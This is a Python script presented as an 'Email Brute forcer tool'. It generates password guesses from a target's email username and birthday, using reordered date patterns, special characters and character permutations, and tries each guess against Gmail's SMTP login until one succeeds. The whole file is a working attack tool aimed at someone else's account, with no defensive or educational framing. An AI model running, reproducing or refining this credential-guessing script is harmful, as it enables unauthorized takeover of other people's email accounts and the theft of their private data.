#!/usr/bin/env python
import smtplib
from itertools import permutations, product

def generate_passwords(name, birthday):
    passwords = set()
    special_chars = ['@', '#', '!', '$', '%', '&', '*']

    # Basic combinations
    passwords.add(name)
    passwords.add(birthday)
    
    # Split birthday into day, month, year
    day, month, year = birthday[:2], birthday[2:4], birthday[4:]

    # Different combinations using name and birthday
    patterns = [
        f"{name}{day}{month}{year}",
        f"{name}{year}{month}{day}",
        f"{name}{month}{day}{year}",
        f"{year}{month}{day}",
        f"{day}{month}{year}",
        f"{month}{day}{year}",
        f"{year}{name}",
        f"{name}{year}"
    ]

    # Add patterns with special characters
    for pattern in patterns:
        passwords.add(pattern)
        for char in special_chars:
            passwords.add(f"{pattern}{char}")
            passwords.add(f"{char}{pattern}")
            passwords.add(f"{pattern[:len(pattern)//2]}{char}{pattern[len(pattern)//2:]}")
    
    # Create permutations of patterns with special characters
    for pattern in patterns:
        for p in permutations(pattern):
            combined = ''.join(p)
            passwords.add(combined)
            for char in special_chars:
                passwords.add(f"{combined}{char}")
                passwords.add(f"{char}{combined}")
                passwords.add(f"{combined[:len(combined)//2]}{char}{combined[len(combined)//2:]}")
    
    # Return list of unique passwords
    return list(passwords)

print("                             ")
print("\t#################################################")
print("\t#         Welcome to Email Brute forcer tool    #")
print("\t#          Created by @ashujaiswal109           #")
print("\t#################################################")
print("                             ")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter target email id: ")
username = user.split('@')[0]  # Extract username from email
birthday = input("Enter target's birthday (DDMMYYYY): ")
print("                                   ")

# Generate passwords using the provided information
passwords = generate_passwords(username, birthday)

for password in passwords:
    try:
        smtpserver.login(user, password)
        print(f"Voila! password found: {password}")
        print("                                   ")
        break
    except smtplib.SMTPAuthenticationError:
        print(f"Password not found: {password}")
        print("                                   ")
    except UnicodeEncodeError:
        print(f"Skipping password due to encoding issue: {password}")
        print("                                   ")

